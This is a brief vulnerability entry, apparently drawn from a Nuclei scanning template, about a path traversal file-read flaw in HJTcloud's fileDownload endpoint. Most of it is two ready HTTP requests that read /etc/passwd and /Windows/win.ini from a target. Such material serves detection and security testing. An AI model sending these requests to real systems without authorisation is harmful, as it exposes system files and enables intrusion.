# Vulnerability: HJTcloud - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`hjtcloud-arbitrary-file-read.yaml`)

## Description
HJTcloud is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /fileDownload?action=downloadBackupFile HTTP/1.1
Host: {{Hostname}}
Accept: application/json, text/plain, */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

fullPath=/etc/passwd

POST /fileDownload?action=downloadBackupFile HTTP/1.1
Host: {{Hostname}}
Accept: application/json, text/plain, */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

fullPath=/Windows/win.ini
```

